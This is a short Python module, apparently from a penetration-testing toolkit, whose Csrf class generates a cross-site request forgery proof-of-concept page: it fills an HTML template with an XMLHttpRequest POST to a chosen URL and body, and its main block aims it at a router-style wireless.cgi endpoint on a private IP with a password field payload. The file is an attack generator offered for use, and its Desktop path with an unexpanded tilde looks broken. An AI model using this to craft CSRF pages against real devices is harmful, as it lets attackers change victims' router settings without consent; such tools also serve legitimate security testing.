# binwalk -Mre filename
#

from tools.Utility import *


class Csrf(UtilityTool):
    def __init__(self, config_file):
        super(Csrf, self).__init__(config_file)

    def get_basic_command(self, cmd):
        template = open('template.html', 'r')

        poc = open('~/Desktop/poc.html', 'w+')

        for x in range(0, 5):
            poc.writelines(template.readline())
        template.readline()
        poc.writelines('            x.open("POST", "{}");\n'.format(cmd['url']))
        for x in range(0, 2):
            poc.writelines(template.readline())
        template.readline()
        poc.writelines('            x.send("{}");\n'.format(cmd['payload']))
        for x in range(0, 7):
            poc.writelines(template.readline())
        poc.close()
        template.close()
        return 'echo The poc.html file is located on the Desktop'


if __name__ == '__main__':
    test_obj = Csrf("config.json")
    cmd = {}

    cmd['url'] = 'http://10.10.10.254/cgi-bin/wireless.cgi'
    cmd['payload'] = 'password=1&pay=2'

    cmd = (test_obj.get_basic_command(cmd))
